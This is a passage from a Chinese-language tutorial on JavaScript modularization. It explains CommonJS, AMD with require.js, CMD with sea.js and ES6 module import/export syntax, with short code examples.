模块化固然有多个好处，然而一个页面需要引入多个js文件，就会出现以上这些问题。而这些问题可以通过<strong>模块化规范</strong>来解决，下面介绍开发中最流行的commonjs, AMD, ES6, CMD规范。</p><h1 id="CommonJS"><a href="#CommonJS" class="headerlink" title="CommonJS"></a>CommonJS</h1><p>Node.js是commonJS规范的主要实践者，它有四个重要的环境变量为模块化的实现提供支持：<code>module</code>、<code>exports</code>、<code>require</code>、<code>global</code>。实际使用时，用<code>module.exports</code>定义当前模块对外输出的接口（不推荐直接用<code>exports</code>），用<code>require</code>加载模块。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义模块math.js</span></span><br><span class="line"><span class="keyword">var</span> basicNum = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">module</span>.exports = &#123; <span class="comment">//在这里写上需要向外暴露的函数、变量</span></span><br><span class="line">  <span class="attr">add</span>: add,</span><br><span class="line">  <span class="attr">basicNum</span>: basicNum</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 引用自定义的模块时，参数包含路径，可省略.js</span></span><br><span class="line"><span class="keyword">var</span> math = <span class="built_in">require</span>(<span class="string">&#x27;./math&#x27;</span>);</span><br><span class="line">math.add(<span class="number">2</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 引用核心模块时，不需要带路径</span></span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line">http.createService(...).listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure><p>CommonJS用<strong>同步</strong>的方式加载模块。<strong>在服务端，模块文件都存在本地磁盘，读取非常快，所以这样做不会有问题。</strong></p><p><strong>但是在浏览器端，限于网络原因，更合理的方案是使用异步加载。</strong></p><h1 id="AMD和require-js"><a href="#AMD和require-js" class="headerlink" title="AMD和require.js"></a>AMD和require.js</h1><p>AMD规范采用<strong>异步</strong>方式加载模块，模块的加载不影响它后面语句的运行。所有依赖这个模块的语句，都定义在一个回调函数中，等到加载完成之后，这个回调函数才会运行。这里介绍用require.js实现AMD规范的模块化：用<code>require.config()</code>指定引用路径等，用<code>define()</code>定义模块，用<code>require()</code>加载模块。</p><p>首先我们需要引入require.js文件和一个入口文件main.js。main.js中配置<code>require.config()</code>并规定项目中用到的基础模块。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** 网页中引入require.js及main.js **/</span></span><br><span class="line">&lt;script src=<span class="string">&quot;js/require.js&quot;</span> data-main=<span class="string">&quot;js/main&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** main.js 入口文件/主模块 **/</span></span><br><span class="line"><span class="comment">// 首先用config()指定各模块路径和引用名</span></span><br><span class="line"><span class="built_in">require</span>.config(&#123;</span><br><span class="line">  <span class="attr">baseUrl</span>: <span class="string">&quot;js/lib&quot;</span>,</span><br><span class="line">  <span class="attr">paths</span>: &#123;</span><br><span class="line">    <span class="string">&quot;jquery&quot;</span>: <span class="string">&quot;jquery.min&quot;</span>,  <span class="comment">//实际路径为js/lib/jquery.min.js</span></span><br><span class="line">    <span class="string">&quot;underscore&quot;</span>: <span class="string">&quot;underscore.min&quot;</span>,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 执行基本操作</span></span><br><span class="line"><span class="built_in">require</span>([<span class="string">&quot;jquery&quot;</span>,<span class="string">&quot;underscore&quot;</span>],<span class="function"><span class="keyword">function</span>(<span class="params">$,_</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// some code here</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>引用模块的时候，我们将模块名放在<code>[]</code>中作为<code>reqiure()</code>的第一参数；如果我们定义的模块本身也依赖其他模块,那就需要将它们放在<code>[]</code>中作为<code>define()</code>的第一参数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义math.js模块</span></span><br><span class="line">define(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> basicNum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> add = <span class="function"><span class="keyword">function</span> (<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x + y;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">add</span>: add,</span><br><span class="line">        <span class="attr">basicNum</span> :basicNum</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 定义一个依赖underscore.js的模块</span></span><br><span class="line">define([<span class="string">&#x27;underscore&#x27;</span>],<span class="function"><span class="keyword">function</span>(<span class="params">_</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> classify = <span class="function"><span class="keyword">function</span>(<span class="params">list</span>)</span>&#123;</span><br><span class="line">    _.countBy(list,<span class="function"><span class="keyword">function</span>(<span class="params">num</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> num &gt; <span class="number">30</span> ? <span class="string">&#x27;old&#x27;</span> : <span class="string">&#x27;young&#x27;</span>;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">classify</span> :classify</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 引用模块，将模块放在[]内</span></span><br><span class="line"><span class="built_in">require</span>([<span class="string">&#x27;jquery&#x27;</span>, <span class="string">&#x27;math&#x27;</span>],<span class="function"><span class="keyword">function</span>(<span class="params">$, math</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> sum = math.add(<span class="number">10</span>,<span class="number">20</span>);</span><br><span class="line">  $(<span class="string">&quot;#sum&quot;</span>).html(sum);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h1 id="CMD和sea-js"><a href="#CMD和sea-js" class="headerlink" title="CMD和sea.js"></a>CMD和sea.js</h1><p>require.js在申明依赖的模块时会在第一之间加载并执行模块内的代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">define([<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;f&quot;</span>], <span class="function"><span class="keyword">function</span>(<span class="params">a, b, c, d, e, f</span>) </span>&#123; </span><br><span class="line">    <span class="comment">// 等于在最前面声明并初始化了要用到的所有模块</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span>) &#123;</span><br><span class="line">      <span class="comment">// 即便没用到某个模块 b，但 b 还是提前执行了</span></span><br><span class="line">      b.foo()</span><br><span class="line">    &#125; </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>CMD是另一种js模块化方案，它与AMD很类似，不同点在于：<strong>AMD 推崇依赖前置、提前执行，CMD推崇依赖就近、延迟执行</strong>。此规范其实是在sea.js推广过程中产生的。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** AMD写法 **/</span></span><br><span class="line">define([<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;f&quot;</span>], <span class="function"><span class="keyword">function</span>(<span class="params">a, b, c, d, e, f</span>) </span>&#123; </span><br><span class="line">     <span class="comment">// 等于在最前面声明并初始化了要用到的所有模块</span></span><br><span class="line">    a.doSomething();</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="comment">// 即便没用到某个模块 b，但 b 还是提前执行了</span></span><br><span class="line">        b.doSomething()</span><br><span class="line">    &#125; </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** CMD写法 **/</span></span><br><span class="line">define(<span class="function"><span class="keyword">function</span>(<span class="params"><span class="built_in">require</span>, <span class="built_in">exports</span>, <span class="built_in">module</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">&#x27;./a&#x27;</span>); <span class="comment">//在需要时申明</span></span><br><span class="line">    a.doSomething();</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> b = <span class="built_in">require</span>(<span class="string">&#x27;./b&#x27;</span>);</span><br><span class="line">        b.doSomething();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** sea.js **/</span></span><br><span class="line"><span class="comment">// 定义模块 math.js</span></span><br><span class="line">define(<span class="function"><span class="keyword">function</span>(<span class="params"><span class="built_in">require</span>, <span class="built_in">exports</span>, <span class="built_in">module</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $ = <span class="built_in">require</span>(<span class="string">&#x27;jquery.js&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> add = <span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exports</span>.add = add;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 加载模块</span></span><br><span class="line">seajs.use([<span class="string">&#x27;math.js&#x27;</span>], <span class="function"><span class="keyword">function</span>(<span class="params">math</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> sum = math.add(<span class="number">1</span>+<span class="number">2</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h1 id="ES6模块化"><a href="#ES6模块化" class="headerlink" title="ES6模块化"></a>ES6模块化</h1><h2 id="mjs-与-js"><a href="#mjs-与-js" class="headerlink" title=".mjs 与 .js"></a><code>.mjs</code> 与 <code>.js</code></h2><p>纵观此文，我们使用 <code>.js</code> 扩展名的模块文件，但在其它一些文章中，你可能会看到 <code>.mjs</code> 扩展名的使用。<a href="https://v8.dev/features/modules#mjs">V8推荐了这样的做法</a>，比如有下列理由：</p><ul><li>比较清晰，这可以指出哪些文件是模块，哪些是常规的JavaScript。</li><li>这能保证你的模块可以被运行时环境和构建工具识别，比如 <a href="https://nodejs.org/api/esm.html#esm_enabling">Node.js</a> 和 <a href="https://babeljs.io/docs/en/options#sourcetype">Babel</a>。</li></ul><p>但是我们决定继续使用 <code>.js</code> 扩展名，未来可能会更改。为了使模块可以在浏览器中正常地工作，你需要确保你的服务器能够正常地处理 <code>Content-Type</code> 头，其应该包含 JavaScript 的MIME 类型 <code>text/javascript</code>。如果没有这么做，你可能会得到 一个严格 MIME 类型检查错误：“The server responded with a non-JavaScript MIME type （服务器返回了非 JavaScript MIME 类型）”，并且浏览器会拒绝执行相应的 JavaScript 代码。多数服务器可以正确地处理 <code>.js</code> 文件的类型，但是 <code>.mjs</code> 还不行。已经可以正常响应 <code>.mjs</code> 的服务器有 <a href="https://pages.github.com/">GitHub 页面</a> 和 Node.js 的 <code>http-server</code>。</p><p> 如果你已经在使用相应的环境了，那么一切正常。或者如果你还没有，但你知道你在做什么（比如你可以配置服务器以为 <code>.mjs</code> 设置正确的 <code>Content-Type</code>）。但如果你不能控制提供服务，或者用于公开文件发布的服务器，这可能会导致混乱。</p><p>为了学习和保证代码的可移植的目的，我们建议使用 <code>.js</code>。</p><p>如果你认为使用 <code>.mjs</code> 仅用于模块带来的清晰性非常重要，但不想引入上面描述的相应问题，你可以仅在开发过程中使用 <code>.mjs</code>，而在构建过程中将其转换为 <code>.js</code>。</p><p>另注意：</p><ul><li>一些工具不支持 <code>.mjs</code>，比如 <a href="https://www.typescriptlang.org/">TypeScript</a>。</li><li><code>&lt;script type=&quot;module&quot;&gt;</code> 属性用于指示引入的模块。</li></ul><h2 id="导出模块的功能"><a href="#导出模块的功能" class="headerlink" title="导出模块的功能"></a>导出模块的功能</h2><p>为了获得模块的功能要做的第一件事是把它们导出来。使用 <code>export</code> 语句来完成。</p><p>最简单的方法是把它（指上面的export语句）放到你想要导出的项前面，比如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> name = <span class="string">&#x27;square&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">draw</span>(<span class="params">ctx, length, x, y, color</span>) </span>&#123;</span><br><span class="line">  ctx.fillStyle = color;</span><br><span class="line">  ctx.fillRect(x, y, length, length);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">length</span>: length,</span><br><span class="line">    <span class="attr">x</span>: x,</span><br><span class="line">    <span class="attr">y</span>: y,</span><br><span class="line">    <span class="attr">color</span>: color</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你能够导出<strong>函数</strong>，<code>var</code>，<code>let</code>，<code>const</code>, 和<strong>类</strong>。export要放在最外层；比如你不能够在函数内使用<code>export</code>。</p><p>一个更方便的方法导出所有你想要导出的模块的方法是在模块文件的末尾使用一个export 语句， 语句是用花括号括起来的用逗号分割的列表。比如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> &#123; name, draw, reportArea, reportPerimeter &#125;;</span><br></pre></td></tr></table></figure><h2 id="导入功能到你的脚本"><a href="#导入功能到你的脚本" class="headerlink" title="导入功能到你的脚本"></a>导入功能到你的脚本</h2><p>你想在模块外面使用一些功能，那你就需要导入他们才能使用。最简单的就像下面这样的：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; name, draw, reportArea, reportPerimeter &#125; <span class="keyword">from</span> <span class="string">&#x27;/js-examples/modules/basic-modules/modules/square.mjs&#x27;</span>;</span><br></pre></td></tr></table></figure><p>使用 <code>import</code> 语句，然后你被花括号包围的用逗号分隔的你想导入的功能列表，然后是关键字from，然后是模块文件的路径。模块文件的路径是相对于站点根目录的相对路径，对于我们的<code>basic-modules</code> 应该是<code> /js-examples/modules/basic-modules</code>。</p><p>当然，我们写的路径有一点不同—我们使用点语法意味 “<strong>当前路径</strong>”，跟随着包含我们想要找的文件的路径。这比每次都要写下整个相对路径要好得多，因为它更短，使得URL 可移植 —如果在站点层中你把它移动到不同的路径下面仍然能够工作。（</p><p>那么看看例子吧：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/js/examples/modules/basic-modules/modules/square.mjs</span><br></pre></td></tr></table></figure><p>变成了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./modules/square.mjs</span><br></pre></td></tr></table></figure><p>你可以在<code>main.mjs</code>中看到这些。</p><p><strong>备注：</strong>在一些模块系统中你可以忽略文件扩展名（比如<code>&#39;/model/squre&#39;</code> .这在原生JavaScript 模块系统中不工作。</p><p>因为你导入了这些功能到你的脚本文件，你可以像定义在相同的文件中的一样去使用它。下面展示的是在 <code>main.mjs</code> 中的import 语句下面的内容。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> myCanvas = create(<span class="string">&#x27;myCanvas&#x27;</span>, <span class="built_in">document</span>.body, <span class="number">480</span>, <span class="number">320</span>);</span><br><span class="line"><span class="keyword">let</span> reportList = createReportList(myCanvas.id);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> square1 = draw(myCanvas.ctx, <span class="number">50</span>, <span class="number">50</span>, <span class="number">100</span>, <span class="string">&#x27;blue&#x27;</span>);</span><br><span class="line">reportArea(square1.length, reportList);</span><br><span class="line">reportPerimeter(square1.length, reportList);</span><br></pre></td></tr></table></figure><h2 id="应用模块到你的HTML"><a href="#应用模块到你的HTML" class="headerlink" title="应用模块到你的HTML"></a>应用模块到你的HTML</h2><p>现在我们只需要将main.mjs模块应用到我们的HTML页面。 这与我们将常规脚本应用于页面的方式非常相似，但有一些显着的差异。</p><p>首先，你需要把 <code>type=&quot;module&quot;</code> 放到<code>&lt;script/&gt;</code>标签中, 来声明这个脚本是一个模块:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;module&quot;</span> <span class="attr">src</span>=<span class="string">&quot;main.mjs&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>你导入模块功能的脚本基本是作为顶级模块。 如果省略它，Firefox就会给出错误“SyntaxError: import declarations may only appear at top level of a module。</p><p>你只能在模块内部使用 <code>import</code> 和<code>export</code> 语句 ；不是普通脚本文件。</p><p><strong>备注：</strong>您还可以将模块导入内部脚本，只要包含 <code>type=&quot;module&quot;</code>，例如 <code>&lt;script type=&quot;module&quot;&gt; //include script here &lt;/script&gt;</code>.</p><h2 id="其他模块与标准脚本的不同"><a href="#其他模块与标准脚本的不同" class="headerlink" title="其他模块与标准脚本的不同"></a>其他模块与标准脚本的不同</h2><ul><li>你需要注意本地测试 — 如果你通过本地加载Html 文件 (比如一个 <code>file://</code> 路径的文件), 你将会遇到 CORS 错误，因为JavaScript 模块安全性需要。你需要通过一个服务器来测试。</li><li>另请注意，您可能会从模块内部定义的脚本部分获得不同的行为，而不是标准脚本。 这是因为<strong>模块自动使用严格模式</strong>。</li><li>加载一个模块脚本时不需要使用 <code>defer</code> 属性，<strong>模块会自动延迟加载</strong>。</li><li>最后一个但不是不重要，你需要明白模块功能导入到单独的脚本文件的范围 — 他们无法在全局获得。因此，你只能在导入这些功能的脚本文件中使用他们，你也无法通过 JavaScript console 中获取到他们，比如，在DevTools 中你仍然能够获取到语法错误，但是你可能无法像你想的那样使用一些debug 技术 。</li></ul><h2 id="默认导出-vs-命名导出"><a href="#默认导出-vs-命名导出" class="headerlink" title="默认导出 vs 命名导出"></a>默认导出 vs 命名导出</h2><p>到目前为止我们导出的功能都是由<strong>named exports</strong> 组成— 每个项目（无论是函数，常量等）在导出时都由其名称引用，并且该名称也用于在导入时引用它。</p><p>还有一种导出类型叫做 <strong>default export</strong> —这样可以很容易地使模块提供默认功能，并且还可以帮助JavaScript模块与现有的CommonJS和AMD模块系统进行互操作。</p><p>看个例子来解释它如何工作。在我们的基本模块<code>square.mjs</code>中，您可以找到一个名为<code>randomSquare()</code>的函数，它创建一个具有随机颜色，大小和位置的正方形。我们想作为默认导出，所以在文件的底部我们这样写 ：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> randomSquare;</span><br></pre></td></tr></table></figure><p>注意，<strong>不要大括号</strong>。</p><p>我们可以把 <code>export default</code> 放到函数前面，定义它为一个匿名函数，像这样：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span>(<span class="params">ctx</span>) </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在我们的<code>main.mjs</code> 文件中，我们使用以下行导入默认函数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> randomSquare <span class="keyword">from</span> <span class="string">&#x27;./modules/square.mjs&#x27;</span>;</span><br></pre></td></tr></table></figure><p>同样，没有大括号，因为每个模块只允许有一个默认导出, 我们知道 <code>randomSquare</code> 就是需要的那个。上面的那一行相当于下面的缩写：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;<span class="keyword">default</span> <span class="keyword">as</span> randomSquare&#125; <span class="keyword">from</span> <span class="string">&#x27;./modules/square.mjs&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="重命名导出与导入"><a href="#重命名导出与导入" class="headerlink" title="重命名导出与导入"></a>重命名导出与导入</h2><p>在你的 <code>import</code> 和 <code>export</code> 语句的大括号中，可以使用 <code>as</code> 关键字跟一个新的名字，来改变你在顶级模块中将要使用的功能的标识名字。因此，例如，以下两者都会做同样的工作，尽管方式略有不同：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// inside module.mjs</span></span><br><span class="line"><span class="keyword">export</span> &#123;</span><br><span class="line">  function1 <span class="keyword">as</span> newFunctionName,</span><br><span class="line">  function2 <span class="keyword">as</span> anotherNewFunctionName</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// inside main.mjs</span></span><br><span class="line"><span class="keyword">import</span> &#123; newFunctionName, anotherNewFunctionName &#125; <span class="keyword">from</span> <span class="string">&#x27;/modules/module.mjs&#x27;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// inside module.mjs</span></span><br><span class="line"><span class="keyword">export</span> &#123; function1, function2 &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// inside main.mjs</span></span><br><span class="line"><span class="keyword">import</span> &#123; function1 <span class="keyword">as</span> newFunctionName,</span><br><span class="line">         function2 <span class="keyword">as</span> anotherNewFunctionName &#125; <span class="keyword">from</span> <span class="string">&#x27;/modules/module.mjs&#x27;</span>;</span><br></pre></td></tr></table></figure><p>让我们看一个真实的例子。在我们的重命名目录中，您将看到与上一个示例中相同的模块系统，除了我们添加了<code>circle.mjs</code>和<code>triangle.mjs</code>模块以绘制和报告圆和三角形。</p><p>在每个模块中，我们都有<code>export</code> 相同名称的功能，因此每个模块底部都有相同的导出语句：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> &#123; name, draw, reportArea, reportPerimeter &#125;;</span><br></pre></td></tr></table></figure><p>将它们导入<code>main.mjs</code>时，如果我们尝试使用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; name, draw, reportArea, reportPerimeter &#125; <span class="keyword">from</span> <span class="string">&#x27;./modules/square.mjs&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; name, draw, reportArea, reportPerimeter &#125; <span class="keyword">from</span> <span class="string">&#x27;./modules/circle.mjs&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; name, draw, reportArea, reportPerimeter &#125; <span class="keyword">from</span> <span class="string">&#x27;./modules/triangle.mjs&#x27;</span>;</span><br></pre></td></tr></table></figure><p>浏览器会抛出一个错误，例如“SyntaxError: redeclaration of import name”（Firefox）。</p><p>相反，我们需要重命名导入，使它们是唯一的：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; name <span class="keyword">as</span> squareName,</span><br><span class="line">         draw <span class="keyword">as</span> drawSquare,</span><br><span class="line">         reportArea <span class="keyword">as</span> reportSquareArea,</span><br><span class="line">         reportPerimeter <span class="keyword">as</span> reportSquarePerimeter &#125; <span class="keyword">from</span> <span class="string">&#x27;./modules/square.mjs&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; name <span class="keyword">as</span> circleName,</span><br><span class="line">         draw <span class="keyword">as</span> drawCircle,</span><br><span class="line">         reportArea <span class="keyword">as</span> reportCircleArea,</span><br><span class="line">         reportPerimeter <span class="keyword">as</span> reportCirclePerimeter &#125; <span class="keyword">from</span> <span class="string">&#x27;./modules/circle.mjs&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; name <span class="keyword">as</span> triangleName,</span><br><span class="line">        draw <span class="keyword">as</span> drawTriangle,</span><br><span class="line">        reportArea <span class="keyword">as</span> reportTriangleArea,</span><br><span class="line">        reportPerimeter <span class="keyword">as</span> reportTrianglePerimeter &#125; <span class="keyword">from</span> <span class="string">&#x27;./modules/triangle.mjs&#x27;</span>;</span><br></pre></td></tr></table></figure><p>请注意，您可以在模块文件中解决问题，例如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// in square.mjs</span></span><br><span class="line"><span class="keyword">export</span> &#123; name <span class="keyword">as</span> squareName,</span><br><span class="line">         draw <span class="keyword">as</span> drawSquare,</span><br><span class="line">         reportArea <span class="keyword">as</span> reportSquareArea,</span><br><span class="line">         reportPerimeter <span class="keyword">as</span> reportSquarePerimeter &#125;;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// in main.mjs</span></span><br><span class="line"><span class="keyword">import</span> &#123; squareName, drawSquare, reportSquareArea, reportSquarePerimeter &#125; <span class="keyword">from</span> <span class="string">&#x27;/js-examples/modules/renaming/modules/square.mjs&#x27;</span>;</span><br></pre></td></tr></table></figure><p>它也会起作用。 你使用什么样的风格取决于你，但是单独保留模块代码并在导入中进行更改可能更有意义。 当您从没有任何控制权的第三方模块导入时，这尤其有意义。</p><h2 id="创建模块对象"><a href="#创建模块对象" class="headerlink" title="创建模块对象"></a>创建模块对象</h2><p>上面的方法工作的挺好，但是有一点点混乱、亢长。一个更好的解决方是，<strong>导入每一个模块功能到一个模块功能对象上</strong>。可以使用以下语法形式：</p><figure class="highlight 